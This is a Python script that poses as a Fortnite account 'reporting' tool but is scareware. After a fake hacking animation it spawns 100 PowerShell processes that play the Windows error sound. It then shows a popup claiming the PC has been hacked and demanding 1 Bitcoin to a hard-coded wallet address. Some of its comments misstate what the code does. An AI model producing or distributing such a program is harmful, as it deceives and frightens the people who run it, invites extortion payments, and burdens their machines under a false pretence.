import time
import random
import string
import ctypes
import sys
import subprocess

def ascii_art():
    ascii = """
         ▄▄▄▄▄▪  ▄ •▄ ▄▄▄▄▄      ▄ •▄     ▄▄▄▄· ▄• ▄▌▄▄▌  ▄ •▄     ▄▄▄  ▄▄▄ . ▄▄▄·      ▄▄▄  ▄▄▄▄▄██▌██•  █▌▄▌▪    ▀▄ █·▀▄.▀·▐█ ▄█▪     ▀▄ ▄· ▐█.▪ ▄█▀▄▀▀█▄█▌▐█▌██▪  ▐▀▀▄·    ▐πππ▄ ▐πππθ▄ ██▀· ▄█▀▄ ▐πππ▄  ▐█.▪
         ▐█▌·▐█▌█▐█▄█▌▐█▌▐▌▐█.█▌    ▐█•█▌▐█▄▄▌▐█▪·•▐█▌.▐▌▐█•█▌ ▐█▌·
         ▀▀▀ ▀▀▀·▀  ▀ ▀▀▀  ▀█▄▀▪·▀  ▀    ·▀▀▀▀  ▀▀▀ .ππππ ·▀  ▀    .ππππ ππππ .π    ▀█▄▀▪.π  π πππ
     ██╗  ██╗██╗   ██╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
     ██║ ██╔╝██║   ██║██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
     █████╔╝ ██║   ██║█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
     ██╔═██╗ ██║   ██║██╔══╝  ██╔═══╝ ╚██╗ ██╔╝██╔══╝  ██╔══██╗
     ██║  ██╗╚██████╔╝███████╗██║     ╚████╔╝ ███████╗██║  ██║
     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝      ╚═══╝  ╚══════╝╚═╝  ╚═╝
"""
    print(ascii)

def hacking_animation(duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        chars = ''.join(random.choices(string.ascii_uppercase + string.digits, k=25))
        print("\r[*] Reporting account... " + chars, end="")
        time.sleep(0.1)

def fake_virus_popup():
    # Generate a fake Bitcoin wallet address
    fake_wallet_address = "1Cm8eGcQg6WVuLrDQ9eQ6B5zEfzUkQ2bV8"
    # Set flag parameter to 0x00000001 to disable the close button
    ctypes.windll.user32.MessageBoxW(None, f"Your PC has been hacked!\n\nAll your files will be destroyed unless you send 1 Bitcoin to the following address:\n\n{fake_wallet_address}", "Virus Alert", 0x00000001)

def play_error_sound():
    # Play error sound 100 times using subprocess
    for _ in range(100):
        subprocess.Popen(["powershell", "(New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Windows Error.wav').PlaySync()"])

if __name__ == "__main__":
    ascii_art()
    username = input("[?] Enter the Fortnite username: ")
    print(f"[] Reporting account: {username}\n")
    hacking_animation(50)
    
    # Play error sound
    play_error_sound()
    
    # Display fake virus popup
    fake_virus_popup()
    
    # Add an infinite loop
    while True:
        time.sleep(1)
        # Break the loop and close the script after a delay
        time.sleep(5)
        break
    
    # Close the script
    sys.exit(0)
